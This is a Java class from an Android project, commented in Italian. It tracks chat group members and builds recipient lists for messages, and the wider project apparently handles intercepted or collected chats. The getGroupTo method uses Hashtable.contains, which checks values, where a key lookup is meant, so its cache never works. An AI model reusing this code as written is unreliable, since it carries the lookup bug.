package com.android.networking.module.chat;

import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/* Gestore di gruppi di utenti nelle chat */
public abstract class ChatGroups {
	private static final String TAG = "ChatGroups";

	final Hashtable<String, List<String>> groups = new Hashtable<String, List<String>>();
	final Hashtable<String, String> tos = new Hashtable<String, String>();

	/* identificato un gruppo si aggiunge, uno alla volta con questo metodo, un peer */
	void addPeerToGroup(String groupName, String remote) {
		if (Cfg.DEBUG) {
			Check.requires(isGroup(groupName), "peer is not a group: " + groupName);
			Check.log("Adding group " + groupName + " : " + remote);
		}
		List<String> list;
		if (groups.containsKey(groupName)) {
			list = groups.get(groupName);
			if (!list.contains(remote)) {
				list.add(remote);
			}
	
		} else {
			list = new ArrayList<String>();
			list.add(remote);
		}
	
		groups.put(groupName, list);
	}

	/* dato un autore e un gruppo, restituisce la stringa di tutti i destinatari */
	String getGroupTo(String author, String groupname) {
		String key = author + groupname;
		if (tos.contains(key)) {
			return tos.get(key);
		}

		List<String> list = groups.get(groupname);
		if(list==null){
			return null;
		}
		StringBuilder builder = new StringBuilder();
		for (String p : list) {
			if (!author.equals(p)) {
				builder.append(p);
				builder.append(",");
			}
		}

		String value = builder.toString();
		tos.put(key, value);
		return value;
	}

	/* dato un peer, dice se e' un gruppo */
	abstract boolean isGroup(String peer);

	/* verifica che il gruppo sia gia' presente */
	public boolean hasMemoizedGroup(String groupName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (hasMemoizedGroup) : " + groupName + " : " + groups.containsKey(groupName));
		}
		return groups.containsKey(groupName);
	}

}
